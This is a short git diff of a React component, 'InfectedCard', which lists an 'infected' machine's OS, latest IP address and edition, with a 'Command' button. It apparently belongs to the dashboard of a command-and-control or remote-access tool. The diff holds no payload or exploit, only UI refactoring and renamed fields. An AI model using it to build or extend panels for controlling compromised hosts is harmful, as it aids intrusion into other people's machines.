@@ -1,5 +1,5 @@
 import React from "react"
-import type {Infected} from "../types/infected.ts";
+import type { Infected } from "../types/infected.ts";
 
 type Props = {
     infected: Infected,
@@ -16,13 +16,15 @@ export const InfectedCard: React.FC<Props> = (props) => {
         <>
             <div className="card bg-base-100 w-60 shadow-sm">
                 <div className="card-body">
-                    {props.infected?.osType === "Windows" && <IoLogoWindows className={"w-40 h-40"}/>}
-                    {props.infected?.osType === "Linux" && <FaLinux className={"w-40 h-40"}/>}
+                    <p>{["Windows", "Windumb"].includes(props.infected?.osType)
+                        ? <IoLogoWindows className={"w-40 h-40"} />
+                        : <FaLinux className={"w-40 h-40"} />}
+                    </p>
                     <div className={"flex items-center gap-5"}>
-                        <h2 className="card-title text-lg">{props.infected.currentIpAddress}</h2>
+                        <h2 className="card-title text-lg">{props.infected.latestIpAddress}</h2>
                         <span className={"w-3 h-3 rounded-full bg-green-500"}></span>
                     </div>
-                    <p>{props.infected?.osType} {props.infected?.osSubType}</p>
+                    <p>{props.infected?.osType} {props.infected.osEdition}</p>
                     <div className="card-actions justify-start">
                         <button className="btn btn-primary" onClick={props.command}>Command</button>
                     </div>
